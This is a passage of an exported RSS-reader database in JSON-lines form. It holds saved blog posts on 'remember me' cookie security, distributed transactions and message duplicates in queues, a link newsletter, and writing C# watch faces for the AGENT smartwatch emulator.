border-left: 0px; display: inline; padding-right: 0px\" alt=\"The American Express website pre-populating the username on return\" src=\"http://lh6.ggpht.com/-4s1S1UF2cYQ/UdFGFMBkHXI/AAAAAAAAFdE/4NdTjBkR_rM/image15.png?imgmax=800\" border=\"0\"></p><p>I’ve not obfuscated the username, the username as it appears above with the stars are stored in a cookie that lasts for three months along with some other data that inevitably identifies the user. Frankly, I don’t see a lot of value in this, remembering your username isn’t usually the problem!</p><p>But it also doesn’t have to be all or nothing, there’s middle ground. For example, the point I made earlier about re-authenticating before key processes are performed if the session had been resumed by a “remember me” feature. It’s a bit of the best of both worlds.</p><h4>In conclusion…</h4><p>This is one of those features that seems like a good idea at the time (and<em>sometimes</em>it is) and it’s usually very easy to get right, at least<em>sufficiently</em>right for most purposes. Frankly, it’s still a little baffling how wrong the two earlier examples got it particularly when you consider that it would have been sufficient to just extend the lifetime of the cookie they already have!</p><p>The other point to take away from this post beyond just the mechanics of the “remember me” feature is how security is such a multi-tiered, inter-dependent beast. You might be able to get away with credentials in cookies by themselves, but combine that with the ELMAH situation or missing HTTP only attributes and XSS flaws and suddenly a foolish albeit relatively innocuous practice becomes a serious risk. What was that about “defence in depth” again?!</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/8M6Zs6dCWn8\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1161}}
{"k":"0000000084","o":"0000009082","v":"001"}
{"_id":1162,"_uid":1162,"_dt":1373742620948,"_s":"4fa3d17ae07d85f258cd49219664962d"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/GYMvtVWO3ts/","title":"Life without distributed transactions","published":{"$wrap":"$date","v":1356950084000,"h":"2012-12-31T10:34:44.000Z"},"starred":false,"read":false,"content":"<p><img src=\"http://www.udidahan.com/wp-content/uploads/article-new_ehow_images_a06_co_v2_preferred-transaction-bankruptcy_-800x800.jpg\" alt=\"transactions\" title=\"transactions\" width=\"250\" height=\"167\" style=\"float:right; margin-left:10px; margin-bottom:10px; \" />Occasionally I get questions about the issue of transactional messaging – why is it so important, why does NServiceBus default to this behavior, and if we didn’t use it, what bad things could happen. I’m talking specifically about the ability to enlist a queue in a distributed transaction here.</p><p>I think the reason for this interest is the rise in popularity of cloud platforms and queuing systems like RabbitMQ (which don’t support distributed transactions) and the difficulty of setting up distributed transactions even in on-premise.</p><p>Of course, there’s also the regular scalability hand-wringing going on even though most people wouldn’t bump up against those limits anyway.</p><p>In this post, I’ll talk about the nature of the problem, explain the pitfalls in some of the common solutions, but I’ll put off the description of how to provide consistency without distributed transactions to a future post as this one is already going to be quite long.</p><p>I’ll start with the basic fault-tolerance issues and then explain how things spiral out from there.</p><h3>Starting with the basics</h3><p>OK, so we have a queuing system in place that dispatches messages to our business logic which does some transactional work against a database.</p><p>Let’s say that we completed the transaction against our database but before we could acknowledge to the queue that the message was processed successfully, our machine crashed. What our machine comes up again, the queue will once again dispatch us the same message. Unless we have some logic to detect that we’ve already processed it (called “idempotence” in the REST community), we will end up processing it again.</p><p>In short, the problem is duplicates.</p><h3>Attempted solutions to the duplicate problem</h3><p>Most queuing systems don’t do anything about duplicates, actually giving it a proper architectural name: At-least-once message delivery, as opposed to the Once-and-only-once model that a queue that supports distributed transaction provides.</p><p>The solution often suggested is to have your logic check to see if it has already processed a message with that ID before – in essence storing the ID of each message processed for some period of time. Of course, there is some performance overhead with that, but it might be a small price to pay compared to dealing with it in the logic of every use case.</p><p>On the other hand, you’ll often have some messages (like Update commands) for which it looks like you can safely process them multiple times, in which case you might want not to pay the performance overhead there. The thing is, if your logic publishes an event in addition to the regular database work (something that is quite common) and you process the same message twice, you will probably end up publishing the event twice as well. </p><p>These duplicates are different in that here we have two distinct messages with different IDs that contain the same business data. This means that recipients of these messages will not be able to filter them out at an infrastructure level anymore.</p><h3>NOTE: Deduplication abilities in queues</h3><p>Although the Azure Service Bus doesn’t support distributed transactions meaning you still have the issue mentioned above, Microsoft added the ability to detect and filter out duplicates based on message contents rather than just the ID. This helps quite a bit but it’s important to understand that that doesn’t cover everything for you. Let me explain:</p><h3>More complex logic</h3><p>In some of your most important use cases, you may have both entity updates as well as entity creation happening together in your domain model. You might be using some kind of event model (like I wrote about <a href=\"http://www.udidahan.com/2009/06/14/domain-events-salvation/\">here</a>) to percolate out the information that an entity was created in order to keep your service layer decoupled from the internals of the domain model.</p><p>In the callback code from these domain events, you will likely publish out an event on the queuing system containing information like the ID of the entities created as well as other business data. And there’s the rub.</p><p>You see, without distributed transactions, you can run into some problematic scenarios:</p><p>For example, if you don’t make sure that your event publishing calls to the queuing system include the same transaction object as the one you used when retrieving the original message from the queue, then those calls could “escape” before you know if the database transaction is going to succeed. Deadlocks always happen at the lousiest times. Anyway, if you’re using database generated IDs for your entities, then those IDs will get published out in events despite the database rolling back and your subscribers will now be making decisions on <b><i>wrong</i></b> data – not just eventually consistent data.</p><p>In this case, processing the message again doesn’t really solve the problem – it just means that you’ll be publishing events with different IDs, so an infrastructure like Azure Service Bus couldn’t really de-duplicate them.</p><p>On the other hand, if you do use the same transaction and combine in the infrastructural message ID based de-duplication described above (as identifying duplicate calls for complex business logic is damn hard), you’ll run into another problem. </p><p>Consider what would happen if your server crashes right after finishing its database work but before it completes the transaction against the queuing system. When going to retry the message, the infrastructure filtering thing would know not to call your business logic again and that message would be quietly swallowed. Unfortunately, the event publishing calls to the queuing system from the first time the message was processed were rolled back and since your business logic isn’t called again, the event publishing won’t happen again.</p><p>Oops.</p><h3>In closing</h3><p>I hope I’ve been able to clarify what kind of scenarios distributed transactions solve for you and some of the difficulties in solving them yourself.</p><p>Now, to be clear, you could solve these problems by going in-depth on each of your use cases, analyzing the consistency needs and structuring the code differently to address those needs. But give this another thought, if our consistency is dependent on calling otherwise independent APIs in exactly the right order, and that a change in this order would not cause any visible functional effects, what would happen when developers with less expertise maintain this code?</p><p>The folks in the event sourcing community have their solution to this which is based on writing their business logic differently. As the adoption of this pattern is still pretty limited (probably still in the Innovator section of the Technology Adoption Curve), it’ll be interesting to see how it holds up with larger teams in the mainstream.</p><p>Oh, and in case it wasn’t clear from before, the guys in the REST community haven’t even begun addressing this problem when it comes to server-to-server integration.</p><p>We’re working on a solution for this with NServiceBus that won’t require you to change how you write business logic. We’ve got one big release to do before we can roll this in, and that’s coming soon (with all sorts of cool things like support for ActiveMQ and queues in the database). The solution we’ve found is architecturally sound but you’ll have to wait for my next post to hear about it.</p><p>Stay tuned.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=GYMvtVWO3ts:YdNfS8nWsBk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=GYMvtVWO3ts:YdNfS8nWsBk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=GYMvtVWO3ts:YdNfS8nWsBk:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=GYMvtVWO3ts:YdNfS8nWsBk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=GYMvtVWO3ts:YdNfS8nWsBk:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/GYMvtVWO3ts\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1162}}
{"k":"0000000084","o":"0000007593","v":"001"}
{"_id":1163,"_uid":1163,"_dt":1373742620948,"_s":"d818b71154e008f034c1b64f1a92f837"}
{"subscription":{"$wrap":"$oid","v":39},"link":"http://feeds.hanselman.com/~/43375394/0/scotthanselman~Hanselmans-Newsletter-of-Wonderful-Things-June-th.aspx","title":"Hanselman's Newsletter of Wonderful Things: June 4th, 2013","published":{"$wrap":"$date","v":1373576109000,"h":"2013-07-11T20:55:09.000Z"},"starred":false,"read":false,"content":"<div><p>I have a\"whenever I get around to doing it\"<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~hanselman.com/newsletter\">Newsletter of Wonderful Things</a>. Why a newsletter? I dunno. It seems more personal somehow. Fight me.<p>You can<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/CategoryView.aspx?category=Newsletter\">view all the previous newsletters here</a>. You can<strong>sign up here to the</strong><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~hanselman.com/newsletter\">Newsletter of Wonderful Things</a>or just wait and get them some weeks later on the blog, which<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~feeds.hanselman.com/ScottHanselman\">hopefully you have subscribed to</a>. Email folks get it first!<p><strong>Here's the newsletter that I sent out June 4th.</strong><hr><p>Hi Interfriends,<p>Thanks again for signing up for this experiment. Here's some interesting things I've come upon this week. If you forwarded this (or if it was forwarded to you) a reminder: You can sign up at<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~hanselman.com/newsletter\">http://hanselman.com/newsletter</a>and the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/CategoryView.aspx?category=Newsletter\">archive of all previous Newsletters is here</a>.<p>Remember, you get the newsletter here first. This one will be posted to the blog as an archive in a few weeks. <ul><li>French, but awesome animated gifs about<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~lesjoiesducode.tumblr.com/\">les joies du code</a>.<li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.makeymakey.com/\">MakeyMakey</a>, an invention kit for everyone.<li>Ah, yes,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.gta4.net/map/\">Google StreetView Maps for Grand Theft Auto's Liberty City</a>.<li>How to<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.slideshare.net/mikejeffs/how-to-create-great-slides-for-presentations\">make great slides for presentations</a>.<li>MRuby - The<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~joshnuss.github.io/mruby-web-irb/\">Ruby Interpreter</a>, written in C, then compiled to pure JavaScript and running in the browser. Someone<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~kripken.github.io/lua.vm.js/lua.vm.js.html\">did Lua also</a>!<li>We now have a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~glennmcanally.com/sarcastic/\">font for Sarcasm</a>.<li>Are you coming to the next<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~anglebrackets.org/\">Angle Brackets conference</a>for lovers of the web? It's in October and we've got Douglas Crockford!<li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://www.youtube.com/watch?v=78eexsReL9M\">A\"Thank You\"can change your life</a>.<li>Did you know<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~onehungrymind.com/windows-8-and-angularjs/\">you could build a native Windows 8 app with Angular and JavaScript</a>?<li>Great presentation on Browser Versions. Stop detecting them,<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://speakerdeck.com/getify/browser-versions-are-dead-v5\">and instead check for features</a>!<li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://www.youtube.com/watch?v=VaakJk9vR7U&feature=youtu.be\">Fans made a 40 min additional movie on Lord of the Rings</a>! Low budget, but a labor of love.<li>I still think Google Glass is gonna suck, no matter<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~dcurt.is/glass\">what famous people say</a>.<li>Is the end of the school year<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~jenhatmaker.com/blog/2013/05/30/worst-end-of-school-year-mom-ever\">stressing your parenting skills</a>?<li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.polymer-project.org/\">Polymer</a>looks really compelling if you're thinking about the Web and<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.webcomponentsshift.com/\">Web Components</a>.<li>A popup book...<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~i.imgur.com/NAHCmc2.gif\">made of LEGO</a>.<li><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~technabob.com/blog/2013/06/03/lego-ewok-village-set/\">A 2000-piece LEGO Ewok Village</a>?!? SHUT UP AND TAKE MY MONEY<li>Great lesson video for the kids on<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://www.youtube.com/watch?feature=player_embedded&v=hPLgfGX1I5Y\">how feathers evolved</a>.<li>Looking for a room in New York? Why not get<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.worstroom.com/\">http://www.worstroom.com/</a>? via my friend<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~tinyletter.com/rashidzakat\">Rashid</a><li>Here's a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.bbc.co.uk/5live/films/code_of_conduct.pdf\">required Code of Conduct for going to a movie</a>(PDF).<li>Take great movie stills and extract their color swatches.<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~moviesincolor.com/\">Strangely compelling</a>.<li>Some<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~medevice-users.github.io/diabetes/\">SERIOUS geeking out if you're a diabetic and/or a hardware person</a>!</li></ul><p>Scott Hanselman<p>(BTW, since you *love* email you can subscribe to my blog via email here:<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~feeds.hanselman.com/ScottHanselman\">http://feeds.hanselman.com/ScottHanselman</a>DO IT!)<p>P.P.S. You know you can forward this to your friends, right?</p><br/><hr/>©2013 Scott Hanselman. All rights reserved.<br/></div><Img align=\"left\"border=\"0\"height=\"1\"width=\"1\"style=\"border:0;float:left;margin:0;padding:0\"hspace=\"0\"src=\"http://feeds.hanselman.com/~/i/43375394/0/scotthanselman\"><div style=\"clear:both;padding-top:0.2em;\"><a title=\"Like on Facebook\"href=\"http://feeds.hanselman.com/_/28/43375394/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/fblike20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Share on Google+\"href=\"http://feeds.hanselman.com/_/30/43375394/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/googleplus20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Tweet This\"href=\"http://feeds.hanselman.com/_/24/43375394/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/twitter20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by email\"href=\"http://feeds.hanselman.com/_/19/43375394/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/email20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by RSS\"href=\"http://feeds.hanselman.com/_/20/43375394/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/rss20.png\"style=\"border:0;margin:0;padding:0;\"></a> </div>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1163}}
{"k":"0000000084","o":"0000015104","v":"001"}
{"_id":1164,"_uid":1164,"_dt":1373742620949,"_s":"50875d4a49352030cc8903147cc785e4"}
{"subscription":{"$wrap":"$oid","v":39},"link":"http://feeds.hanselman.com/~/42467483/0/scotthanselman~Exclusive-Sneak-Peek-The-AGENT-Smart-Watch-Emulator-and-managed-NET-code-on-my-wrist.aspx","title":"Exclusive Sneak Peek: The AGENT Smart Watch Emulator and managed .NET code on my wrist!","published":{"$wrap":"$date","v":1371577227000,"h":"2013-06-18T17:40:27.000Z"},"starred":false,"read":false,"content":"<div><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.kickstarter.com/projects/secretlabs/agent-the-worlds-smartest-watch\"><img title=\"The AGENT Smart Watch\"style=\"display: inline\"alt=\"The AGENT Smart Watch\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/fdb2fb7679c4e17b878172640d852fa9_large_3.jpg\"width=\"620\"height=\"275\"/></a></p><p>I'm totally geeked out about Smart Watches. I always have been, from the original<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/REVIEWEDMicrosoftWristNETMSNDirectWatchFromFossil.aspx\">Microsoft SPOT watch</a>(from 10 years ago!) to the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/SmartWatchesAreFinallyGoingToHappenPebbleWatchReviewed.aspx\">Pebble</a>, and now the AGENT Smart Watch from Secret Labs. Secret Labs are the folks that brought us the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://www.google.com/webhp?sourceid=chrome-instant&ion=1&ie=UTF-8#gs_rn=17&gs_ri=psy-ab&tok=aZWoF7UPlLj6_NK-gREr5A&suggest=p&cp=8&gs_id=4x&xhr=t&q=Netduino&es_nrs=true&pf=p&output=search&sclient=psy-ab&oq=Netduino&gs_l=&pbx=1&bav=on.2,or.r_cp.r_qf.&bvm=bv.48137252,d.cGE&fp=c27102543d04f20&biw=0&bih=471&ion=1&bs=1\">Netduino</a>open source electronics platform that uses the .NET Micro Framework. It's pretty awesome that you can write C# and run it in 64k or in 64gigs, from the wrist to the cloud.</p><blockquote><p><strong>Upcoming Conference:</strong>If you're in or around Chicago in July 2013, consider joining Chris Walker from SecretLabs and I at the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~monkeyspace.org\">MonkeySpace</a>conference! We'll be speaking about developing for embedded systems and the AGENT Watch with C#. What are the power considerations? How low-level is this kind of coding? Can one kind of app cause battery drain while another keeps the watch going for a week? What about notifications and bluetooth? We'll cover all this and lots more, join us.</p></blockquote><p><img title=\"The AGENT Smart Watch will talk to your phone\"style=\"float: right; display: inline\"alt=\"The AGENT Smart Watch will talk to your phone\"align=\"right\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/d077ee7030305ec8e20d8b32fc3d221c_large_3.jpg\"width=\"320\"height=\"301\"/>The AGENT Smart Watch was trying to raise $100k to build a watch and as of the time of this writing they are<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.kickstarter.com/projects/secretlabs/agent-the-worlds-smartest-watch\">within spitting distance of a MILLION dollars</a>! There's just hours to go to get in on this cool Kickstarter. (Remember, Kickstarter is an investment, not a store.)</p><p>Not only is this a .NET Microframework Device, but we can start writing apps now using the AGENT Watch Emulator. From their Kickstarter site:</p><blockquote><p>Traditional smartwatches run apps in an unrestricted environment.  AGENT's OS includes a managed runtime, optimized for our low-power architecture.  It is called the .NET Micro Framework and it makes watch apps trustable.</p><p>This feature-rich managed runtime also offers developers modern features they crave: event-based programming; multi-threading; garbage collection; lambda expressions; exception handling; automatic power management; and much more.</p></blockquote><p>You can install VS2012 and the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~netmf.codeplex.com/releases/view/81000\">.NET Micro Framework 4.3</a>and write an app for your wrist! I alluded to this a little in my Xamarin talk\"<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/XamarinEvolve2013TalkVideoHowCSavedMyMarriage.aspx\">How C# Saved My Marriage</a>.\" You can write .NET apps for embedded systems, a watch, tablets, desktops, web sites, large cloud systems and more.</p><blockquote><p><strong>Full disclosure:</strong>I have no financial stake or business relationship with SecretLabs, but we are friends and I'm a fan. I helped Chris with some copy writing on the Kickstarter page, its text and reviewing the video as a favor. I have received no money from SecretLabs and I backed the Kickstarter with my own money.</p></blockquote><p><strong><img title=\"image\"style=\"float: right; display: inline\"alt=\"image\"align=\"right\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_3.png\"width=\"251\"height=\"231\"/></strong>I got a preview of the<strong>AGENT Smart Watch emulator</strong>, and some code from Kickstarter backer<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~dk.linkedin.com/in/ebast\">Esben Bast</a>who created a binary clock face. I loaded up VS2012 and the binary clock emulator. This initial code is just about 100 lines. You can see the references in Solution Explorer here. SPOT means\"Smart Personal Object Technlogy.\"</p><p>The fact that there is an emulator is huge. No worries about breaking a watch or even having a watch! The Agent Watch SDK puts a reference to the AGENT Emulator in my registry, so it shows up directly in Visual Studio:</p><p><img title=\"image\"style=\"display: inline\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_8.png\"width=\"319\"height=\"217\"/></p><p>Then I can debug my watch app without a watch, just as if I were writing a Phone App or Web Site. It's a first class experience inside of VS. This makes me feel particularly empowered as a .NET developer because it means<em>I already know how to write apps for this watch</em>and I've never even seen it before..</p><p><img src=\"http://hanselman.com/blog/content/binary/agentsmartwatchanimation.gif\"/></p><p>The code is pretty straightforward, if appropriately low-level. This IS a small device we're talking about!</p><p>You've got total control over the screen and what can be displayed. You could create any watch face that you could imagine (that would fit on the screen) because you have a Bitmap to draw to.</p><p>The .NET Micro Framework has no fonts<em>loaded</em>by default, but I can include them as resources. There's some\"<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~msdn.microsoft.com/en-us/library/cc533019.aspx\">tinyfnt</a>\" files in C:\\Program Files (x86)\\Microsoft .NET Micro Framework\\v4.3\\Fonts or I could download or make some myself. Even better I can<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~informatix.miloush.net/microframework/Utilities/TinyFontTool.aspx\">use the TinyFontTool from Miloush</a>.</p><p>I can load a font from a resource like this:</p><pre class=\"brush: csharp; toolbar: false; auto-links: false;\">font = Resources.GetFont(Resources.FontResources.small);</pre><p>and then later in my UpdateTime() method, Draw the time on my binary clock screen.</p><pre class=\"brush: csharp; toolbar: false; auto-links: false;\">_bitmap.DrawText(DateTime.Now.ToString(\"HH:mm:ss\"), font, Color.White, 45, 15);</pre><p>Run my emulator again and I have the time printed as well!</p><p><img title=\"Now my AGENT Smart Watch has the time printed above the Binary Clock\"style=\"display: inline\"alt=\"Now my AGENT Smart Watch has the time printed above the Binary Clock\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_11.png\"width=\"315\"height=\"438\"/></p><p>The only real\"microframework-ism\" in the code is that the watch face doesn't want to use a lot of power, so you should\"go to sleep.\" It's the same as if you were writing a console app. If your main() function ends, then your app will end! But, since this is a watch face, we want it to run all the time, so, we start a 1 second timer, then sleep the main() forever. Everything interesting happens as an event on a background thread. (The watch can control the lifetime and tombstone or kill the watch face if you're doing other things.)</p><pre class=\"brush: csharp; toolbar: false; auto-links: false;\">public static void Main()<br>{<br>_bitmap = new Bitmap(Bitmap.MaxWidth, Bitmap.MaxHeight);<br>_font = Resources.GetFont(Resources.FontResources.small);<br><br>// display the time immediately<br>UpdateTime(null);<br><br>// set up timer to refresh time every minute<br>DateTime currentTime = DateTime.Now;<br>TimeSpan dueTime = new TimeSpan(0); // beginning of next minute<br>TimeSpan period = new TimeSpan(0, 0, 0, 1, 0); // update time every minute<br>_updateClockTimer = new Timer(UpdateTime, null, dueTime, period); // start our minute timer<br><br>_button = new InterruptPort(HardwareProvider.HwProvider.GetButtonPins(Button.VK_SELECT),<br>false,<br>Port.ResistorMode.PullDown,<br>Port.InterruptMode.InterruptEdgeBoth);<br>_button.OnInterrupt += _button_OnInterrupt;<br>// go to sleep; time updates will happen automatically every minute<br>Thread.Sleep(Timeout.Infinite);<br>}</pre><p>That last part is interesting. You've got two event handlers here, the one to UpdateTime every second and then one to watch for the Button getting pressed. You want the watch app to be event-driven...it needs to do as<strike>little as possible</strike>NOTHING until it's time to do something. This InterruptPort is watching for the the middle button (the VK_SELECT button). ResisterMode.PullDown means the button will show\"1\" or<em>true</em>when it's pressed. InterruptEdgeBoth means I get events when the button is pressed AND when it goes up.</p><h3>Go make Watch Apps!</h3><p>Here's another cool watch face from<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://www.facebook.com/media/set/?set=vb.239788096166290&type=2\">Dylan Mazurek</a>next to the Big Digits example:</p><p><img title=\"PixelFace example Watch for AGENT Smart Watch\"style=\"display: inline\"alt=\"PixelFace example Watch for AGENT Smart Watch\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_14.png\"width=\"315\"height=\"438\"/> <img title=\"BigDigits example Watch for AGENT Smart Watch\"style=\"display: inline\"alt=\"BigDigits example Watch for AGENT Smart Watch\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_17.png\"width=\"315\"height=\"438\"/></p><p>And finally, here's an animated concept for a World Time face that<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://twitter.com/Gutworks\">Steve Bulgin</a>made for Pete Brown as well as another<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://twitter.com/Gutworks\">Steve</a>concept below:</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://twitter.com/Gutworks\"><img src=\"http://hanselman.com/blog/content/binary/agentsmartwatchworldwatchface.gif\"/></a></p><p>The next step will be more than watch faces, it will be watch utilities and apps. Maybe an app for my FitBit, or an app to manage Blood Sugar? Perhaps a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/NestThermostatReview2ndGenerationEveryConsumerElectronicDeviceShouldBeThisPolished.aspx\">Nest</a>app to<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/NestThermostatReview2ndGenerationEveryConsumerElectronicDeviceShouldBeThisPolished.aspx\">control my thermostat</a>?</p><p>The AGENT Watch Emulator emulator will be available to download<strong>this Thursday</strong>at<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.agentwatches.com\">www.agentwatches.com</a>. You can get ready by installing the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.netmf.com/\">.NET Micro Framework</a>today.</p><blockquote><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://twitter.com/Gutworks\"><img title=\"Steve Bulgin watch face for the AGENT smart watch\"style=\"float: right; display: inline\"alt=\"Steve Bulgin watch face for the AGENT smart watch\"align=\"right\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/HoH_Watch_Face_3.png\"width=\"128\"height=\"128\"/></a>Watch apps can be written in C# using Microsoft Visual Studio 2012 (including the free Express edition). Deploy your apps over Bluetooth and debug them interactively.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.microsoft.com/visualstudio/eng/downloads#d-express-windows-desktop\">Download Visual Studio Express 2012</a><br><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.agentwatches.com/downloads/MicroFrameworkSDK_NETMF43.msi\">Download .NET Micro Framework SDK v4.3</a></p><p>Developers can also use AGENT as a secondary display, interacting with it remotely via Bluetooth from their Objective-C, C#, or Java smartphone app.</p></blockquote><p>Even though the watch ships in December, I'm going to start writing apps now so I'm ready for the Watch App Store (coming soon)!</p><br><hr/>©2013 Scott Hanselman. All rights reserved.<br></div><Img align=\"left\"border=\"0\"height=\"1\"width=\"1\"style=\"border:0;float:left;margin:0;padding:0\"hspace=\"0\"src=\"http://feeds.hanselman.com/~/i/42467483/0/scotthanselman\"><div style=\"clear:both;padding-top:0.2em;\"><a title=\"Like on Facebook\"href=\"http://feeds.hanselman.com/_/28/42467483/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/fblike20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Share on Google+\"href=\"http://feeds.hanselman.com/_/30/42467483/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/googleplus20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Tweet This\"href=\"http://feeds.hanselman.com/_/24/42467483/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/twitter20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by email\"href=\"http://feeds.hanselman.com/_/19/42467483/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/email20.png\"style=\"border:0;margin:0;padding:0;\"></a> <a title=\"Subscribe by RSS\"href=\"http://feeds.hanselman.com/_/20/42467483/scotthanselman\"><img height=\"20\"src=\"http://assets.feedblitz.com/i/rss20.png\"style=\"border:0;margin:0;padding:0;\"></a> </div>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1164}}
{"k":"0000000084","o":"0000003042","v":"001"}
{"_id":1165,"_uid":1165,"_dt":1373742620949,"_s":"8199677ac76a9997c3cbfe7b54467e48"}
